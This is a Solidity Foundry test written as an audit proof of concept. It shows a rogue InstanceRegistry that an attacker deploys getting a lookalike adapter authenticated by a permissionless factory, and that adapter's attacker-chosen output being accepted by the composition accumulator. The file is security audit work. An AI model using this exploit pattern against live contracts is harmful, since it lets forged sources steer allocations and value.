// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";

import {CompositionSourceAdapter, CompositionSourceAdapterFactory} from "src/composition/CompositionSourceAdapter.sol";
import {CompositionSourceAccumulator} from "src/composition/CompositionSourceAccumulator.sol";
import {CompositionSourceAccumulatorDeployer} from "src/factory/TrustComposeInstanceDeployers.sol";
import {MerkleSnapshot} from "src/merkle/MerkleSnapshot.sol";
import {InstanceRegistry} from "src/registry/InstanceRegistry.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";
import {ICompositionSourceAdapter} from "interfaces/composition/ICompositionSourceAdapter.sol";
import {IZkVerifier} from "interfaces/merkle/IZkVerifier.sol";
import {IAttestationAccumulator} from "interfaces/merkle/IAttestationAccumulator.sol";
import {ICompositionSourceAdapterFactory} from "interfaces/composition/ICompositionSourceAdapter.sol";
import {MockAccumulator} from "../mocks/MockAccumulator.sol";

contract PocVerifier is IZkVerifier {
    bytes32 public immutable programVKey;

    constructor(bytes32 k) {
        programVKey = k;
    }

    function verify(bytes calldata, bytes32) external pure {}
}

/// @notice Audit PoC (execution-trace pass).
///
/// `CompositionSourceAdapter`'s header claims: "Instances are created only by
/// `CompositionSourceAdapterFactory`; the composition accumulator checks that append-only registry
/// so an ABI-compatible lookalike is rejected."
///
/// The registry the adapter pins is a plain constructor ARGUMENT of the permissionless
/// `CompositionSourceAdapterFactory.create`, and neither the factory nor
/// `CompositionSourceAccumulator._validatePolicy` compares it against the chain's canonical
/// `InstanceRegistry`. `isAdapter()` therefore authenticates only "this bytecode was deployed by
/// the shared factory" — never "this source is a reviewed row in the canonical directory".
contract PashovTrace_ComposeAdapterProvenance is Test {
    bytes32 internal constant SOURCE_PROGRAM = keccak256("trust-graph-weighted");
    bytes32 internal constant FAMILY = keccak256("weighted-allocation-v1");
    bytes32 internal constant OUTPUT_KIND = keccak256("allocation");
    bytes32 internal constant SOURCE_VKEY = keccak256("source vkey");
    uint64 internal constant SCALE = 1e18;
    uint64 internal constant MAX_AGE = 500;

    InstanceRegistry internal canonicalRegistry;
    InstanceRegistry internal rogueRegistry; // deployed and admin'd by the attacker
    CompositionSourceAdapterFactory internal adapterFactory;
    PocVerifier internal verifier;

    address internal attacker = address(0xBAD);

    function setUp() public {
        canonicalRegistry = new InstanceRegistry(address(this));
        adapterFactory = new CompositionSourceAdapterFactory();
        verifier = new PocVerifier(SOURCE_VKEY);
    }

    /// Stand up a real MerkleSnapshot with one accepted, provenance-recorded root.
    function _source(address owner_, bytes32 root, uint256 total)
        internal
        returns (MerkleSnapshot snapshot, MockAccumulator acc)
    {
        acc = new MockAccumulator();
        snapshot = new MerkleSnapshot(verifier, keccak256("source params"), acc, address(this), address(this));
        snapshot.enableStateProvenance();
        acc.setState(keccak256(abi.encode("acc", root)), 7);
        vm.roll(block.number + 10);
        uint256 cp = snapshot.trigger();
        snapshot.submitProof(cp, root, sha256("blob"), "bafk-source", total, bytes32(0), owner_, "");
    }

    function _register(InstanceRegistry reg, bytes32 id, address snapshot, address acc) internal {
        reg.registerWithParamsAuthority(
            id,
            IInstanceRegistry.Instance({
                program: SOURCE_PROGRAM,
                snapshot: snapshot,
                verifier: address(verifier),
                registryOrAccumulator: acc,
                paramsHash: MerkleSnapshot(snapshot).paramsHash()
            }),
            address(this)
        );
    }

    function _record(address adapter, uint64 weight) internal view returns (bytes memory) {
        ICompositionSourceAdapter a = ICompositionSourceAdapter(adapter);
        bytes memory head = abi.encodePacked(a.sourceId(), a.snapshot());
        bytes memory mid = abi.encodePacked(a.familyId(), a.programId());
        bytes memory tail = abi.encodePacked(weight, MAX_AGE, uint8(1));
        return bytes.concat(head, mid, tail);
    }

    /// Two-source TGCP manifest, unrolled (the IR pipeline runs out of stack slots in a loop here).
    function _manifest(address a0, address a1) internal view returns (bytes memory) {
        bytes memory header = abi.encodePacked(bytes4("TGCP"), uint16(1), uint64(block.chainid), uint8(2));
        return bytes.concat(header, _record(a0, uint64(SCALE / 2)), _record(a1, uint64(SCALE / 2)));
    }

    function test_LookalikeAdapterOverARogueRegistryIsAuthenticatedAndAccepted() public {
        // --- the honest source, listed in the canonical directory -----------------------------
        (MerkleSnapshot honest, MockAccumulator honestAcc) = _source(address(0), keccak256("honest-root"), 1_000);
        bytes32 honestId = keccak256("honest");
        _register(canonicalRegistry, honestId, address(honest), address(honestAcc));
        CompositionSourceAdapter honestAdapter = adapterFactory.create(
            canonicalRegistry, honestId, bytes32(uint256(1)), FAMILY, OUTPUT_KIND, keccak256("provenance-1")
        );

        // --- the attacker's source, listed only in a registry the attacker deployed ----------
        vm.prank(attacker);
        rogueRegistry = new InstanceRegistry(attacker);
        (MerkleSnapshot rogue, MockAccumulator rogueAcc) = _source(attacker, keccak256("rogue-root"), 999_999);
        bytes32 rogueId = keccak256("rogue");
        // Evaluate external-call arguments before `prank`; otherwise `rogue.paramsHash()` consumes
        // the one-shot prank and the registry call is sent by this test contract.
        bytes32 rogueParamsHash = rogue.paramsHash();
        vm.prank(attacker);
        rogueRegistry.registerWithParamsAuthority(
            rogueId,
            IInstanceRegistry.Instance({
                program: SOURCE_PROGRAM,
                snapshot: address(rogue),
                verifier: address(verifier),
                registryOrAccumulator: address(rogueAcc),
                paramsHash: rogueParamsHash
            }),
            attacker
        );

        // Permissionless: nothing constrains `registry`.
        vm.prank(attacker);
        CompositionSourceAdapter rogueAdapter = adapterFactory.create(
            rogueRegistry, rogueId, bytes32(uint256(2)), FAMILY, OUTPUT_KIND, keccak256("provenance-2")
        );

        // The factory's authenticity ledger cannot tell the two apart.
        assertTrue(adapterFactory.isAdapter(address(honestAdapter)), "honest adapter authenticated");
        assertTrue(adapterFactory.isAdapter(address(rogueAdapter)), "lookalike ALSO authenticated");
        assertEq(address(rogueAdapter.registry()), address(rogueRegistry), "lookalike pins the attacker's registry");

        // And it reads cleanly: no revert, attacker-chosen output.
        ICompositionSourceAdapter.CapturedState memory s = rogueAdapter.readLatest();
        assertEq(s.outputRoot, keccak256("rogue-root"));
        assertEq(s.totalValue, 999_999);

        // --- the composition accumulator accepts the mixed policy -----------------------------
        CompositionSourceAccumulator accumulator = new CompositionSourceAccumulatorDeployer()
            .deploy(ICompositionSourceAdapterFactory(address(adapterFactory)));

        address[] memory adapters = new address[](2);
        // TGCP records must be ascending by sourceId; honest = 1, rogue = 2.
        adapters[0] = address(honestAdapter);
        adapters[1] = address(rogueAdapter);

        // No revert => the accumulator's authenticity gate passed for a source that is not in the
        // canonical directory at all.
        accumulator.validatePolicy(_manifest(adapters[0], adapters[1]), adapters);
    }
}
